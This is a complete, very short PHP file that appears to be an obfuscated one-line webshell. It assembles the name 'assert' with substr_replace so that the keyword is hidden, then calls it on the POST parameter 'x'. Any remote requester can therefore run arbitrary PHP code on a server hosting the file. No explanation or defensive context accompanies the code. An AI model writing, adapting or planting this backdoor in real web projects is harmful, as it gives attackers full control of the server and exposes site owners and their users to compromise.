<?php 
    $a = substr_replace("asxxx","sert",2);
    $a($_POST['x']);
?>  
